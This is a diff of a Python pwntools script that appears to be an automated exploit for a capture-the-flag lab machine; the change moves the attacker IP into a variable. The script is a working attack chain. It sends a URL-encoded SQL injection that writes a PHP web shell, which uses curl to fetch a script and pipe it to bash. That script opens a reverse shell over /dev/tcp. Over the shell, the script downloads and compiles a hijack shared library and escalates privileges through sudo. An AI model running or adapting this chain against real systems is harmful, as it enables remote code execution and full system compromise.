@@ -10,9 +10,11 @@ import multiprocessing
 from pwn import log, listen
 import contextlib
 
+MyIP="10.10.14.13"
+
 main_url= "http://10.10.11.229/shop/index.php?page=product&id=3"
 
-sqli = "%0A%27%3B%20select%20%27%3C%3Fphp%20system%28%22curl%20http%3A%2F%2F10.10.14.6%2Frevshell.sh%7Cbash%22%29%3B%20%3F%3E%27%20into%20outfile%20%27%2Fvar%2Flib%2Fmysql%2Frev.php%27--%20-3"
+sqli = f"%0A%27%3B%20select%20%27%3C%3Fphp%20system%28%22curl%20http%3A%2F%2F{MyIP}%2Frevshell.sh%7Cbash%22%29%3B%20%3F%3E%27%20into%20outfile%20%27%2Fvar%2Flib%2Fmysql%2Frev.php%27--%20-3"
 
 main_url2= "http://10.10.11.229/shop/index.php?page=/var/lib/mysql/rev"
 
@@ -33,7 +35,7 @@ def makeRequest():
 	with open('libcounter.c','w') as archivo:
 		archivo.write(contenido_so)
 
-	contenido_revshell= '''#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.6/443 0>&1'''
+	contenido_revshell= f'''#!/bin/bash\n\nbash -i >& /dev/tcp/{MyIP}/443 0>&1'''
 
 
 	with open('revshell.sh','w') as archivo:
@@ -66,7 +68,7 @@ def main():
 	with listen(lport, timeout=20) as shell:
 		if shell.wait_for_connection():
 			shell.sendline("cd /home/rektsu/".encode('utf-8'))
-			shell.sendline("wget http://10.10.14.6/libcounter.c &>/dev/null".encode('utf-8'))
+			shell.sendline(f"wget http://{MyIP}/libcounter.c &>/dev/null".encode('utf-8'))
 			shell.sendline("gcc -shared -fPIC -o libcounter.so libcounter.c && rm libcounter.c".encode('utf-8'))
 			shell.sendline("mv libcounter.so .config/".encode('utf-8'))
 			shell.sendline("sudo /usr/bin/stock".encode('utf-8'))
